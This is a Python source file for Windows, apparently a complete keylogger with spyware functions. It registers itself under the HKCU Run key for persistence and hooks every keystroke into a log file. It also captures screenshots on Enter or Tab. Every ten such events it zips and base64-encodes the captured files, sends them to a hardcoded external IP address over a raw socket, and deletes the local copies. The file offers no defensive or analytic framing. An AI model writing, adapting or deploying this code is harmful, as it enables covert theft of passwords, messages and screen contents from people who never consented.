# -*-coding:utf8 -*-
import pyHook
import pythoncom
import time
import socket
from PIL import ImageGrab
import os,sys
import win32api, win32con
import os
import zipfile
import codecs
import base64
gg=0
class AutoTask(object):
    def __init__(self, path):
        self.path = path
    def work(self):
        runpath = 'Software\Microsoft\Windows\CurrentVersion\Run'
        hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_SET_VALUE)
        path = os.path.abspath(self.path)
        if False == os.path.isfile(path):
		print 'no'
		return False
        (filepath, filename) = os.path.split(path)
        win32api.RegSetValueEx(hKey, filename, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(hKey)
	print 'OK!'
        return True
def write_msg_to_txt(msg):
	f=open(name,'a')
	f.write(msg+'\r\n')
	f.close()
def walk_dir(dir,filelist,extName,extName1,topdown=True):  #获取目录下的jpg&txt
	for root,dirs,files in os.walk(dir,topdown):
		for name in files:
			if (os.path.splitext(os.path.join(root,name)))[-1]==extName or extName1:
				filelist.append(os.path.join(root,name))
		for name in dirs:
			if (os.path.splitext(os.path.join(root,name)))[-1]==extName or extName1:
				fileslist.append(os.path.join(root,name))
def onKeyboardEvent(event):
	global MSG
	if (127>=event.Ascii>31) or (event.Ascii==8):
		MSG+=chr(event.Ascii)
	if (event.Ascii==9) or (event.Ascii==13):   #Tab键9和回车键13
		write_msg_to_txt(MSG)
		MSG=''
		pic_name=time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
		pic=ImageGrab.grab()
		pic.save('D:/jietu/%s.jpg' %pic_name)
		global gg
		gg=gg+1
		print gg
		if (gg>=10):
			target=('115.29.79.37',6666)
			buf_size=6553533
			dicName="D:\jietu"
			extName='.jpg'
			extName1='.txt'
			filelist=[]
			walk_dir(dicName,filelist,extName,extName1)
			cs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			cs.connect(target)
			print cs.recv(buf_size)
			zfile=zipfile.ZipFile('in.zip','w',zipfile.ZIP_DEFLATED)
			for f in filelist:
				zfile.write(f)
				os.remove(f)
			zfile.close()
			#base 2进制 加密 encode(infile,outfile)
			infile=open('in.zip','rb')
			tmpfile=open('in.tmp','wb')
			base64.encode(infile,tmpfile)
			infile.close()
			tmpfile.close()
			tmpfile=open('in.tmp','rb')
			cs.send(tmpfile.read())
			tmpfile.close()
			#后续处理 删除中间文件
			os.remove('in.tmp')
			cs.close()
			gg=0
	return True
if __name__ =="__main__":
	name='D:/jietu/monitor.txt'
	path=os.getcwd()
	path+='\modizC.exe'
	print path
	k=AutoTask(path)
	k.work()
	if not os.path.exists('D:/jietu'):
		os.mkdir('D:/jietu')
	MSG=''
	hk=pyHook.HookManager()
	hk.KeyDown=onKeyboardEvent
	hk.HookKeyboard()
	pythoncom.PumpMessages()